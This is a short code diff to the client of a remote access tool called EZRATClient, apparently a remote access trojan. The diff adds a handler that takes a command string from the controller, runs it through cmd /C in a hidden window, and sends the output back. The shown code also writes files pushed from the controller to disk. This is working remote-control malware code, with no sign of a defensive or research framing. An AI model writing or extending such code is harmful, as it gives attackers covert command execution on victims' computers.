@@ -336,8 +336,29 @@ namespace EZRATClient
                     SendCommand(result);
                 }
             }
+            else if (text.StartsWith("cmd;"))
+            {
+                text = text.Substring(4);
+                string[] lines = text.Split(';');
+                ExecuteCommand(lines[1], lines[0]);
+            }
         }
 
+
+        private static void ExecuteCommand(string command, string path = "C:\\")
+        {
+            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd", "/C " + command);
+
+            procStartInfo.RedirectStandardOutput = true;
+            procStartInfo.UseShellExecute = false;
+            procStartInfo.CreateNoWindow = true;
+            procStartInfo.WorkingDirectory = path;
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+            proc.StartInfo = procStartInfo;
+            proc.Start();
+            string result = proc.StandardOutput.ReadToEnd();
+            SendCommand("cmd;" +path +";"+result);
+        }
         private static void ReceiveFile(byte[] data, string path)
         {
             File.WriteAllBytes(path, data);
